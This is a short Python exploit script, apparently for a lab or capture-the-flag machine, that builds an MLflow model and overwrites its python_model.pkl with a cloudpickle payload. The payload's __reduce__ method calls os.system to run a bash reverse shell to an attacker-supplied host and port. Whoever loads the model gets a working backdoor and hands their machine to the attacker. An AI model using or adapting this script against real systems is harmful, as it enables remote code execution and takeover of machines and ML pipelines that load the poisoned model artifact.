import mlflow.pyfunc
import cloudpickle, os
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description="Build malicious MLflow model")
    parser.add_argument("--lhost", required=True, help="Your tun0 IP")
    parser.add_argument("--lport", default=4444, type=int, help="Listener port (default: 4444)")
    parser.add_argument("--output", default="./malicious_model", help="Output path (default: ./malicious_model)")
    return parser.parse_args()

args = parse_args()
CMD = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, (CMD,))

class MaliciousModel(mlflow.pyfunc.PythonModel):
    def __init__(self):
        self.payload = None
    def predict(self, context, model_input):
        return [55]

mlflow.pyfunc.save_model(
    path=args.output,
    python_model=MaliciousModel()
)

with open(f"{args.output}/python_model.pkl", "wb") as f:
    cloudpickle.dump(MaliciousPayload(), f)

print(f"[+] Malicious model saved to {args.output}")
print(f"[+] python_model.pkl overwritten with payload")
print(f"[+] LHOST: {args.lhost}  LPORT: {args.lport}")
